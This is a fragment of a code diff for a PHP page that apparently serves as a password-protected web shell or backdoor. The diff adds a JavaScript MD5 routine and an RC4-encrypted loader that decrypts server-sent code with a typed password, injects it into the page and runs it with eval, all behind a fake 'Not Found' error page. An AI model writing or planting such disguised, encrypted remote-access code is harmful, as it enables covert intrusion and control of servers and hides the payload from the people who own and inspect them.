+		a = hh(a, b, c, d, k[5], 4, -378558);
+		d = hh(d, a, b, c, k[8], 11, -2022574463);
+		c = hh(c, d, a, b, k[11], 16, 1839030562);
+		b = hh(b, c, d, a, k[14], 23, -35309556);
+		a = hh(a, b, c, d, k[1], 4, -1530992060);
+		d = hh(d, a, b, c, k[4], 11, 1272893353);
+		c = hh(c, d, a, b, k[7], 16, -155497632);
+		b = hh(b, c, d, a, k[10], 23, -1094730640);
+		a = hh(a, b, c, d, k[13], 4, 681279174);
+		d = hh(d, a, b, c, k[0], 11, -358537222);
+		c = hh(c, d, a, b, k[3], 16, -722521979);
+		b = hh(b, c, d, a, k[6], 23, 76029189);
+		a = hh(a, b, c, d, k[9], 4, -640364487);
+		d = hh(d, a, b, c, k[12], 11, -421815835);
+		c = hh(c, d, a, b, k[15], 16, 530742520);
+		b = hh(b, c, d, a, k[2], 23, -995338651);
+
+		a = ii(a, b, c, d, k[0], 6, -198630844);
+		d = ii(d, a, b, c, k[7], 10, 1126891415);
+		c = ii(c, d, a, b, k[14], 15, -1416354905);
+		b = ii(b, c, d, a, k[5], 21, -57434055);
+		a = ii(a, b, c, d, k[12], 6, 1700485571);
+		d = ii(d, a, b, c, k[3], 10, -1894986606);
+		c = ii(c, d, a, b, k[10], 15, -1051523);
+		b = ii(b, c, d, a, k[1], 21, -2054922799);
+		a = ii(a, b, c, d, k[8], 6, 1873313359);
+		d = ii(d, a, b, c, k[15], 10, -30611744);
+		c = ii(c, d, a, b, k[6], 15, -1560198380);
+		b = ii(b, c, d, a, k[13], 21, 1309151649);
+		a = ii(a, b, c, d, k[4], 6, -145523070);
+		d = ii(d, a, b, c, k[11], 10, -1120210379);
+		c = ii(c, d, a, b, k[2], 15, 718787259);
+		b = ii(b, c, d, a, k[9], 21, -343485551);
+
+		x[0] = add32(a, x[0]);
+		x[1] = add32(b, x[1]);
+		x[2] = add32(c, x[2]);
+		x[3] = add32(d, x[3]);
+	}
+
+	function md5(s) {
+		txt = '';
+		n = s.length;
+		state = [1732584193, -271733879, -1732584194, 271733878];
+		for (i = 64; i <= s.length; i += 64) {
+			md5cycle(state, md5blk(s.substring(i - 64, i)));
+		}
+		s = s.substring(i - 64);
+		tail = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
+		for (i = 0; i < s.length; i++)
+			tail[i >> 2] |= s.charCodeAt(i) << ((i % 4) << 3);
+		tail[i >> 2] |= 0x80 << ((i % 4) << 3);
+		if (i > 55) {
+			md5cycle(state, tail);
+			for (i = 0; i < 16; i++) tail[i] = 0;
+		}
+		tail[14] = n * 8;
+		md5cycle(state, tail);
+		return hex(state);
+	}
+
+	function md5blk(s) { 
+		md5blks = [];
+		for (i = 0; i < 64; i += 4) {
+			md5blks[i >> 2] = s.charCodeAt(i) + (s.charCodeAt(i + 1) << 8) + (s.charCodeAt(i + 2) << 16) + (s.charCodeAt(i + 3) << 24);
+		}
+		return md5blks;
+	}
+
+	function hex(x) {
+		hex_chr = '0123456789abcdef'.split('');
+		for (i = 0; i < x.length; i++){
+			s = '';
+			for (j = 0; j < 4; j++)
+		s += hex_chr[(x[i] >> (j * 8 + 4)) & 0x0F] + hex_chr[(x[i] >> (j * 8)) & 0x0F];
+			x[i] = s;
+		}
+		return x.join('');
+	}
+<?php 
+	$loader = "var d = document;
+	ajax = new XMLHttpRequest();
 	ajax.onreadystatechange = function() {
 		if (ajax.readyState == 4 && ajax.status == 200) {
-			b = rc4Init(md5(document.getElementById('pss').value));
-			document.getElementsByTagName('html')[0].innerHTML = rc4(atob(ajax.responseText), b);
+			hash = md5(d.getElementById('pss').value);
+			d.getElementsByTagName('html')[0].innerHTML = rc4(atob(ajax.responseText), rc4Init(hash));
+			
+			oldscript = d.getElementsByTagName('head')[0].getElementsByTagName('script')[0];			
+			fixscript = d.createElement('script');
+			fixscript.type = 'text/javascript';
+			fixscript.innerHTML = 'var hash = \"' + hash + '\";' + oldscript.innerHTML;
+			d.head.appendChild(fixscript);
+			oldscript.parentNode.removeChild(oldscript);
 		}
 	}
-	b = rc4Init(md5(document.getElementById('pss').value));
-	p = 'dsr=' + encodeURIComponent(btoa(rc4('me=loader', b)));
+	
+	boxs = rc4Init(md5(d.getElementById('pss').value));
+	post = 'dsr=' + encodeURIComponent(btoa(rc4('me=loader', boxs)));
 	ajax.open('POST', '" . getSelf() . "', true);
 	ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-	ajax.setRequestHeader('Content-Length', p.length);
+	ajax.setRequestHeader('Content-Length', post.length);
 	ajax.setRequestHeader('Connection', 'close');
-	ajax.send(p);";		
-	$loader = base64_encode(rc4($loader, rc4Init($config['sPass']))); 
+	ajax.send(post);";		
 	echo "function load(){
-		loader = '$loader';
-		b = rc4Init(md5(document.getElementById('pss').value));
-		eval(rc4(atob(loader), b));			
+		loader = '" . base64_encode(rc4($loader, rc4Init($config['sPass']))) . "';
+		boxs = rc4Init(md5(document.getElementById('pss').value));
+		eval(rc4(atob(loader), boxs));			
 	}"; ?>
-	
 </script>
 </head><body>
 <h1>Not Found</h1>
